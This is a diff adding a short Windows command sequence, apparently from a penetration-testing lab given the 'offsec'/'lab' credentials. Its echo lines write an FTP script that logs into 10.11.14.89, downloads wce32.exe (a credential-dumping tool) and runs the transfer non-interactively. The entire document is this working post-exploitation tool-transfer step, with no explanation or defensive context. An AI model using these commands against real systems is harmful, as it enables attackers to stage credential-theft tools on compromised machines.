@@ -1,0 +1,8 @@
+echo open 10.11.14.89 >> ftp.txt
+echo USER offsec >> ftp.txt
+echo lab>> ftp.txt
+echo bin >> ftp.txt
+echo GET wce32.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -n -v -s:ftp.txt
+
